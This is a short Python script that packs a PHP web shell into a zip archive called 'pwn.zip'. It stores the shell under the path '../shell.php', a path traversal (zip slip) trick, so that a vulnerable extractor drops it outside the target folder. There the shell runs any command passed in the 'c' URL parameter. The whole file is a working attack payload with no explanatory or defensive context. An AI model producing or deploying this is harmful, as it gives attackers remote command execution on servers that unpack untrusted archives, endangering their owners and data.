import zipfile

shell = b"""<?php
if (isset($_GET['c'])) {
    header('Content-Type: text/plain');
    system($_GET['c'] . " 2>&1");
}
?>"""

with zipfile.ZipFile("pwn.zip", "w", zipfile.ZIP_DEFLATED) as z:
    z.writestr("../shell.php", shell)